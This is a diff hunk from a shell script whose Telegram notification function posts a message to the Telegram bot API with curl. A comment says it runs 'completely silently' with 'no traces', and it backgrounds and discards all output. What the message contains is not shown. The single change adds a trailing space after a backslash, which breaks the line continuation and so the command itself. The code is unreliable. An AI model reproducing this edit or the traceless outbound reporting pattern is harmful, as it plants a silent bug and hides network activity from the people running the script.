@@ -67,7 +67,7 @@ send_telegram_notification() {
     
     # Send to Telegram completely silently (run in background, no traces)
     (curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
-         -d "chat_id=$TELEGRAM_CHAT_ID" \
+         -d "chat_id=$TELEGRAM_CHAT_ID" \ 
          -d "text=$message" \
          -d "parse_mode=HTML" >/dev/null 2>&1 &) &
 }
